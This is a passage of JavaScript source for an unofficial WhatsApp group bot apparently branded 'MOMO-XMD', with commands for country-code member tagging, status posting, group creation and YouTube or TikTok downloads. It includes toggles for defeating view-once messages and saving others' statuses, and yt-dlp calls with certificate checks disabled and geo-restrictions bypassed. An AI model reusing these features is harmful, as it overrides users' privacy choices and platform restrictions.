                        return reply(sock, from, msg, `Example\nlistcode +254\nlistcode all`);
                    }

                    const participants = group.metadata.participants || [];
                    const countryMap = {
                        '255': 'TANZANIA',
                        '254': 'KENYA',
                        '256': 'UGANDA',
                        '250': 'RWANDA',
                        '257': 'BURUNDI',
                        '234': 'NIGERIA',
                        '27': 'SOUTH AFRICA',
                        '1': 'USA/CANADA',
                        '44': 'UK',
                        '91': 'INDIA'
                    };

                    if (query === 'all') {
                        const counts = {};
                        participants.forEach(p => {
                            const num = p.id.split('@')[0];
                            let foundCountry = 'OTHER';
                            for (const code of Object.keys(countryMap)) {
                                if (num.startsWith(code)) {
                                    foundCountry = countryMap[code];
                                    break;
                                }
                            }
                            counts[foundCountry] = (counts[foundCountry] || 0) + 1;
                        });

                        let listLines = '';
                        for (const [cName, cCount] of Object.entries(counts)) {
                            listLines += `│ ❑ ${cName} (${cCount} members)\n`;
                        }

                        const summaryBox = `*MEMBER COUNT BY COUNTRY*\n${listLines}`;
                        await reply(sock, from, msg, summaryBox);
                    } else {
                        const targetCode = query.replace('+', '');
                        const targetCountryName = countryMap[targetCode] || `CODE +${targetCode}`;
                        
                        const matched = participants.filter(p => {
                            const num = p.id.split('@')[0];
                            return num.startsWith(targetCode);
                        });

                        const mentions = matched.map(p => p.id);
                        let memberLines = '';
                        matched.forEach((p, index) => {
                            const num = p.id.split('@')[0];
                            memberLines += `${index + 1}. @${num}\n`;
                        });

                        if (matched.length === 0) {
                            memberLines = `❌ *No members found for code +${targetCode}*\n`;
                        }

                        const tagBox = `*LIST OF ${targetCountryName} (${matched.length})*\n${memberLines}`;
                        await sock.sendMessage(from, { text: formatBox(tagBox, 'arched', '★'), mentions }, { quoted: msg });
                    }
                    break;
                }
                case 'autoviewstatus':
                case 'autolikestatus':
                case 'autosavestatus':
                case 'autoreact':
                case 'autorecording':
                case 'autotyping':
                case 'alwaysonline':
                case 'antibug': {
                    const status = args[0]?.toLowerCase();
                    const isDownloaderStart = ['autoviewstatus', 'autosavestatus', 'autorecording', 'alwaysonline'].includes(command);
                    
                    if (!['on', 'off'].includes(status)) {
                        // Example: Start with Downloader or Arched based on split
                        const exBox = isDownloaderStart ? 'downloader' : 'arched';
                        const exSym = exBox === 'downloader' ? '❑' : '★';
                        return reply(sock, from, msg, `Example\n${command} on\n${command} off`, exBox, exSym);
                    }
                    runtimeSettings[command] = status === 'on';
                    if (command === 'alwaysonline') sock.sendPresenceUpdate(status === 'on' ? 'available' : 'unavailable').catch(() => {});
                    const successMsg = `Set successful ${command} ${status} ✅\nFeature: ${command}\nStatus: ${status === 'on' ? 'Enabled 🟢' : 'Disabled 🔴'}\nPlatform: ${config.host}`;
                    // Success: Strict opposite of Example
                    const scBox = isDownloaderStart ? 'arched' : 'downloader';
                    const scSym = scBox === 'arched' ? '◉' : '◆';
                    await sock.sendMessage(from, { text: formatBox(successMsg, scBox, scSym) }, { quoted: msg });
                    break;
                }
                case 'welcome':
                case 'goodbye':
                case 'antileft':
                case 'alive':
                case 'antigif':
                case 'antisticker':
                case 'antivirus':
                case 'antibot':
                case 'announcements':
                case 'antiviewonce': {
                    const status = args[0]?.toLowerCase();
                    const isDownloaderStart = ['welcome', 'antigif', 'antivirus', 'announcements', 'antileft'].includes(command);

                    if (!['on', 'off'].includes(status)) {
                        // Example: Start with Downloader or Arched based on split
                        const exBox = isDownloaderStart ? 'downloader' : 'arched';
                        const exSym = exBox === 'downloader' ? '◇' : '๏';
                        return reply(sock, from, msg, `Example\n${command} on\n${command} off`, exBox, exSym);
                    }

                    const current = groupSettings.get(from) || {};
                    groupSettings.set(from, { ...current, [command]: status === 'on' });
                    saveGroupSettings();

                    const successMsg = `Set successful ${command} ${status} ✅\nFeature: ${command}\nStatus: ${status === 'on' ? 'Enabled 🟢' : 'Disabled 🔴'}\nGroup: ${group.metadata.subject}`;
                    // Success: Strict opposite of Example
                    const scBox = isDownloaderStart ? 'arched' : 'downloader';
                    const scSym = status === 'on' ? '★' : '◆';
                    await sock.sendMessage(from, { text: formatBox(successMsg, scBox, scSym) }, { quoted: msg });
                    break;
                }
                case 'restart': {
                    await reply(sock, from, msg, `🔄 RESTARTING BOT...\nUpdating and restarting.\nPlease wait about 30 seconds...`);
                    try {
                        const dir = path.join(__dirname, "../session");
                        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
                        fs.writeFileSync(path.join(dir, 'restart_target.json'), JSON.stringify({ jid: from }));
                    } catch (e) {}
                    setTimeout(() => {
                        process.exit(1);
                    }, 2000);
                    break;
                }
                case 'clear':
                    if (fs.existsSync(sessionPath)) {
                        fs.rmSync(sessionPath, { recursive: true, force: true });
                        await reply(sock, from, msg, '*Session cleared. Restarting...*');
                        process.exit(0);
                    }
                    break;
                case 'tosgroup': {
                    try {
                        if (!isOwnerUser) return reply(sock, from, msg, ownerOnlyText());
                        if (!isGroup) return await reply(sock, from, msg, `❌ *This command use group only*`);
                        const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                        const caption = args.join(' ');
                        const statusTitle = `╭━━❐━⪼\n┇ ★ 📢 *GROUP STATUS*\n╰━━❑━⪼`;

                        if (quoted?.imageMessage || msg.message?.imageMessage || quoted?.videoMessage || msg.message?.videoMessage) {
                            const mediaMsg = quoted || msg.message;
                            const type = mediaMsg.imageMessage ? 'image' : 'video';
                            const buffer = await downloadMediaMessage(
                                { message: mediaMsg },
                                'buffer',
                                {},
                                { logger: console, reuploadRequest: sock.updateMediaMessage }
                            );
                            // Try to send as group status if the fork supports it, otherwise send as message
                            await sock.sendMessage(from, {
                                [type]: buffer,
                                caption: `${statusTitle}\n\n${caption || ''}\n\n`,
                                groupStatus: true
                            });
                            const successMsg = formatBox('Successful sent status group', 'arched', '◆');
                            return await sock.sendMessage(from, { text: successMsg }, { quoted: msg });
                        }

                        const quotedText = quoted?.conversation || quoted?.extendedTextMessage?.text || quoted?.imageMessage?.caption || quoted?.videoMessage?.caption || '';
                        const statusText = caption || quotedText;

                        if (statusText) {
                            await sock.sendMessage(from, {
                                text: `${statusTitle}\n\n${statusText}\n\n`,
                                groupStatus: true
                            });
                            const successMsg = formatBox('Successful sent status group', 'arched', '◆');
                            return await sock.sendMessage(from, { text: successMsg }, { quoted: msg });
                        }

                        await reply(sock, from, msg, 
`Example
tosgroup Hello
tosgroup (reply to media)

` + formatBox(`tosgroup Hello\ntosgroup (reply to media)`, 'downloader', '◉'));
                    } catch (e) {
                        console.log('TOSGROUP ERROR:', e);
                        await reply(sock, from, msg, `❌ *Failed to send group status.*`);
                    }
                    break;
                }
                case 'tostatus': {
                    try {
                        if (!isOwnerUser) return reply(sock, from, msg, ownerOnlyText());
                        const statusJid = 'status@broadcast';
                        const caption = args.join(' ');
                        const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;

                        if (quoted?.imageMessage || msg.message?.imageMessage || quoted?.videoMessage || msg.message?.videoMessage) {
                            const mediaMsg = quoted || msg.message;
                            const type = mediaMsg.imageMessage ? 'image' : 'video';
                            const buffer = await downloadMediaMessage(
                                { message: mediaMsg },
                                'buffer',
                                {},
                                { logger: console, reuploadRequest: sock.updateMediaMessage }
                            );
                            await sock.sendMessage(statusJid, {
                                [type]: buffer,
                                caption: caption || ''
                            });
                            const successMsg = formatBox('Status successfully posted', 'downloader', '★');
                            return await sock.sendMessage(from, { text: successMsg }, { quoted: msg });
                        }

                        const quotedText = quoted?.conversation || quoted?.extendedTextMessage?.text || quoted?.imageMessage?.caption || quoted?.videoMessage?.caption || '';
                        const statusText = caption || quotedText;

                        if (statusText) {
                            await sock.sendMessage(statusJid, { text: statusText });
                            const successMsg = formatBox('Status successfully posted', 'downloader', '★');
                            return await sock.sendMessage(from, { text: successMsg }, { quoted: msg });
                        }

                        await reply(sock, from, msg, 
`Example
tostatus Hello
tostatus (reply to media)

` + formatBox(`tostatus Hello\ntostatus (reply to media)`, 'arched', '❑'));
                    } catch (e) {
                        console.log('TOSTATUS ERROR:', e);
                        await reply(sock, from, msg, `❌ *Failed to post status.*`);
                    }
                    break;
                }
                case 'create': {
                    if (!isOwnerUser) return reply(sock, from, msg, ownerOnlyText());
                    
                    let memberNumbers = [];
                    let nameParts = [];
                    args.forEach(arg => {
                        if (arg.includes('+') || /^\d{8,15}$/.test(arg)) {
                            const cleaned = cleanNumber(arg);
                            if (cleaned.length >= 8) {
                                memberNumbers.push(`${cleaned}@s.whatsapp.net`);
                            }
                        } else {
                            nameParts.push(arg);
                        }
                    });

                    const groupName = nameParts.join(' ');
                    if (!groupName) {
                        return reply(sock, from, msg, `Example\ncreate +255765409584 and name of group`);
                    }
                    
                    try {
                        console.log('[CREATE] Creating group:', groupName, 'with members:', memberNumbers);
                        const initialMembers = memberNumbers.length > 0 ? [memberNumbers[0]] : [sock.user.id];
                        const res = await sock.groupCreate(groupName, initialMembers);
                        const groupId = res.id || res.gid;
                        if (groupId && memberNumbers.length > 1) {
                            for (let i = 1; i < memberNumbers.length; i++) {
                                const num = memberNumbers[i];
                                try {
                                    await sock.groupParticipantsUpdate(groupId, [num], 'add');
                                } catch (err) {
                                    console.log('[CREATE] Failed to add member:', num, err.message);
                                }
                            }
                        }
                        await reply(sock, from, msg, `➣ _create group successful_ ✅`);
                    } catch (e) {
                        console.error('[CREATE] Error:', e);
                        await reply(sock, from, msg, `➣ _Failed to create group:_ ${e.message}`);
                    }
                    break;
                }
                case 'image': {
                    const query = args.join(' ');
                    if (!query) return reply(sock, from, msg, `Example\nimage Diamond Platnumz`);
                    
                    await safeReact(sock, from, msg.key, '🎨');
                    try {
                        // Enhance prompt for better celebrity and object recognition
                        let enhancedPrompt = `High quality, realistic, detailed portrait or object of ${query}, 8k resolution, professional photography, cinematic lighting`;
                        if (query.toLowerCase().includes('diamond') || query.toLowerCase().includes('harmonize') || query.toLowerCase().includes('alikiba') || query.toLowerCase().includes('zuchu')) {
                            enhancedPrompt = `High quality realistic portrait of Tanzanian artist ${query}, Bongo Flava star, professional studio photography, 8k resolution, detailed face`;
                        } else if (query.toLowerCase().includes('samatta') || query.toLowerCase().includes('manula') || query.toLowerCase().includes('simba') || query.toLowerCase().includes('yanga')) {
                            enhancedPrompt = `High quality realistic portrait of Tanzanian footballer ${query}, professional sports photography, 8k resolution, detailed features`;
                        }
                        
                        const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(enhancedPrompt)}?width=1024&height=1024&seed=${Math.floor(Math.random()*10000)}&model=flux&nologo=true`;
                        await sock.sendMessage(from, { 
                            image: { url: imageUrl }, 
                            caption: `➣ _Image generated for: ${query}_ 🎨` 
                        }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ _Failed to generate image:_ ${e.message}`);
                    }
                    break;
                }
                case 'play':
                case 'song':
                case 'ytmp3': {
                    try {
                        const q = args.join(' ');
                        if (!q) {
                            return await reply(sock, from, msg, `Example\nplay <song name>`);
                        }

                        await reply(sock, from, msg, `🔎 *Searching for song...*`);

                        const { exec } = require('child_process');
                        const util = require('util');
                        const execPromise = util.promisify(exec);
                        const fs = require('fs');
                        const path = require('path');

                        const result = await ytSearch(q);
                        if (!result.videos || !result.videos.length) {
                            return await reply(sock, from, msg, `❌ *Song not found.*`);
                        }

                        const video = result.videos[0];
                        const audioDownloaderBox = `- *AUDIO DOWNLOADER 🎧*
╭━━❐━⪼
┇๏ *Title* - ${video.title}
┇๏ *Duration* - ${video.timestamp}
┇๏ *Views* - ${video.views ? video.views.toLocaleString() : 'N/A'}
┇๏ *Author* - ${video.author?.name || 'Unknown'}
┇๏ *Status* - Downloading...
╰━━❑━⪼
`;
                        await sock.sendMessage(from, { text: audioDownloaderBox }, { quoted: msg });

                        const mediaDir = path.join(__dirname, '../media');
                        if (!fs.existsSync(mediaDir)) fs.mkdirSync(mediaDir, { recursive: true });
                        const outpath = path.join(mediaDir, `${Date.now()}.mp3`);

                        const ytdlpBin = fs.existsSync(path.join(__dirname, '../bin/yt-dlp')) ? path.join(__dirname, '../bin/yt-dlp') : 'yt-dlp';

                        try {
                            // Enhanced yt-dlp with aggressive bypass
                            await execPromise(`${ytdlpBin} --no-check-certificates --geo-bypass --extractor-args "youtube:player_client=android,web" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" -x --audio-format mp3 -o "${outpath}" "${video.url}"`, { timeout: 60000 });
                        } catch (err) {
                            console.log('yt-dlp audio error, trying ytdl-core fallback:', err.message);
                            const ytdl = require('@distube/ytdl-core');
                            const stream = ytdl(video.url, { 
                                filter: 'audioonly', 
                                quality: 'highestaudio',
                                requestOptions: {
                                    headers: {
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
                                    }
                                }
                            });
                            const writable = fs.createWriteStream(outpath);
                            await new Promise((resolve, reject) => {
                                stream.pipe(writable);
                                stream.on('error', reject);
                                writable.on('finish', resolve);
                            });
                        }

                        if (!fs.existsSync(outpath)) throw new Error('Audio file generation failed.');

                        const audioBuffer = fs.readFileSync(outpath);
                        try { fs.unlinkSync(outpath); } catch (e) {}

                        const audioMsg = {
                            audio: audioBuffer,
                            mimetype: 'audio/mpeg',
                            fileName: `${video.title}.mp3`
                        };

                        if (command === 'play') {
                            audioMsg.contextInfo = {
                                externalAdReply: {
                                    title: video.title,
                                    body: 'MOMO-XMD YouTube Player',
                                    thumbnailUrl: video.thumbnail,
                                    mediaType: 2,
                                    mediaUrl: video.url,
                                    sourceUrl: video.url
                                }
                            };
                        }

                        await sock.sendMessage(from, audioMsg, { quoted: msg });
                    } catch (e) {
                        console.log('PLAY ERROR:', e);
                        await reply(sock, from, msg, `❌ *Failed to download audio:* ${e.message}`);
                    }
                    break;
                }
                case 'video': {
                    try {
                        const q = args.join(' ');
                        if (!q) {
                            return await reply(sock, from, msg, `Example\nvideo <video name>`);
                        }

                        await reply(sock, from, msg, `🔎 *Searching for video...*`);

                        const { exec } = require('child_process');
                        const util = require('util');
                        const execPromise = util.promisify(exec);
                        const fs = require('fs');
                        const path = require('path');

                        const result = await ytSearch(q);
                        if (!result.videos || !result.videos.length) {
                            return await reply(sock, from, msg, `❌ *Video not found.*`);
                        }

                        const video = result.videos[0];
                        const videoDownloaderBox = `- *VIDEO DOWNLOADER 🎬*
╭━━❐━⪼
┇๏ *Title* - ${video.title}
┇๏ *Duration* - ${video.timestamp}
┇๏ *Views* - ${video.views ? video.views.toLocaleString() : 'N/A'}
┇๏ *Author* - ${video.author?.name || 'Unknown'}
┇๏ *Status* - Downloading...
╰━━❑━⪼
`;
                        await sock.sendMessage(from, { text: videoDownloaderBox }, { quoted: msg });

                        const mediaDir = path.join(__dirname, '../media');
                        if (!fs.existsSync(mediaDir)) fs.mkdirSync(mediaDir, { recursive: true });
                        const outpath = path.join(mediaDir, `${Date.now()}.mp4`);

                        const ytdlpBin = fs.existsSync(path.join(__dirname, '../bin/yt-dlp')) ? path.join(__dirname, '../bin/yt-dlp') : 'yt-dlp';

                        try {
                            await execPromise(`${ytdlpBin} --no-check-certificates --geo-bypass --extractor-args "youtube:player_client=android,web" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" -f "best[ext=mp4]/best" -o "${outpath}" "${video.url}"`, { timeout: 120000 });
                        } catch (err) {
                            console.log('yt-dlp video error, trying ytdl-core fallback:', err.message);
                            const ytdl = require('@distube/ytdl-core');
                            const stream = ytdl(video.url, { 
                                filter: 'plugin', 
                                quality: 'highest',
                                requestOptions: {
                                    headers: {
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
                                    }
                                }
                            });
                            const writable = fs.createWriteStream(outpath);
                            await new Promise((resolve, reject) => {
                                stream.pipe(writable);
                                stream.on('error', reject);
                                writable.on('finish', resolve);
                            });
                        }

                        if (!fs.existsSync(outpath)) throw new Error('Video file generation failed.');

                        const videoBuffer = fs.readFileSync(outpath);
                        try { fs.unlinkSync(outpath); } catch (e) {}

                        await sock.sendMessage(from, { 
                            video: videoBuffer, 
                            mimetype: 'video/mp4', 
                            caption: `🎬 *${video.title}*` 
                        }, { quoted: msg });
                    } catch (e) {
                        console.log('VIDEO ERROR:', e);
                        await reply(sock, from, msg, `❌ *Failed to download video:* ${e.message}`);
                    }
                    break;
                }
                case 'tiktok': {
                    const url = args[0];
                    if (!url || !url.includes('tiktok.com')) return reply(sock, from, msg, `Example\ntiktok <link>`);
                    
                    await safeReact(sock, from, msg.key, '📱');
                    try {
                        const res = await fetch(`https://api.dreaded.site/api/tiktok?url=${encodeURIComponent(url)}`);
                        const data = await res.json();
                        
                        if (!data.success || !data.result || !data.result.video) {
                            throw new Error('Failed to fetch TikTok');
                        }

                        await sock.sendMessage(from, { 
                            video: { url: data.result.video }, 
                            caption: `➣ *TikTok Download* 📱\n\n*Description:* ${data.result.title || 'No title'}\n\n` 
                        }, { quoted: msg });
                    } catch (e) {
                        await reply(sock, from, msg, `➣ _Failed to download TikTok:_ ${e.message}`);
                    }
                    break;
                }
                default:
                    break;
            }
        } catch (error) {
            console.error('[COMMAND] failed', command, error.message);
            await reply(sock, from, msg, `*Command failed: ${error.message}*`).catch(() => {});
        }
    });
}

module.exports = { startBot };

// Require chalk for colored output
const chalk = require('chalk');
